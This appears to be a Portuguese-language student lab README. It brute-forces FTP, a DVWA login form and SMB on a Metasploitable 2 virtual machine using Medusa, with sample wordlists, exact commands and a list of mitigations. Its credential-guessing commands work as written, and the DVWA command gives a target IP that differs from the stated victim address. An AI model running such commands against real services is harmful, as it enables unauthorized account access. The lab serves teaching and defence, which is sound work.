# Projeto: Brute Force com Kali Linux + Medusa

## Sobre o Projeto
Projeto prático usando Kali Linux, Metasploitable 2, DVWA e a ferramenta Medusa.  
O objetivo é simular ataques de força bruta em ambiente seguro e entender como proteger serviços reais.

## Objetivos
- Entender ataques de força bruta.
- Testar FTP, DVWA e SMB.
- Criar e usar wordlists.
- Documentar todo o processo.
- Sugerir medidas de mitigação.

## Ambiente Utilizado
- Kali Linux  
- Metasploitable 2  
- DVWA  
- VirtualBox (rede Host-Only)  
- Ferramenta: Medusa

### Estrutura do Lab
[ Kali Linux-  Attacker  ] ----> [ Metasploitable 2 -  Victim ]

### IPs utilizados
- Kali: 192.168.56.102  
- Metasploitable: 192.168.56.101  

---

# 1. Brute Force em FTP com Medusa

## Wordlists usadas

**users.txt**
msfadmin
guest
root
admin

**passwords.txt**
123456
msfadmin
password
admin

## Comando utilizado
`medusa -h 192.168.56.101 -u msfadmin -P passwords.txt -M ftp`

## Resultado esperado
O Medusa testa até encontrar a senha válida, normalmente `msfadmin`.

---

# 2. Brute Force em Formulário Web (DVWA) com Medusa

## Comando utilizado
`medusa -h 192.168.56.10 -U users.txt -P passwords.txt -M http \`
`-m DIR:/dvwa/login.php \`
`-m FORM:"username=^USER^&password=^PASS^&Login=Login" \`
`-m DENY:"Login failed"`

(Os parâmetros variam conforme o formulário. Indicamos a URL, os campos e a string de falha.)

---

# 3. Brute Force em SMB com Medusa

## Comando utilizado
`medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt`

## Resultado esperado
O Medusa identifica contas válidas no serviço SMB.

---

# Boas Práticas e Mitigação
- Não usar senhas fracas.
- Limitar tentativas de login.
- Aplicar MFA sempre que possível.
- Desabilitar serviços desnecessários.
- Monitorar logs de autenticação.

---

# Conclusão
Este projeto demonstra como ataques de brute force funcionam e como usar o Medusa em diferentes serviços.  
Além disso, reforça a importância de políticas de senha e medidas de proteção contra ataques automáticos.




                 
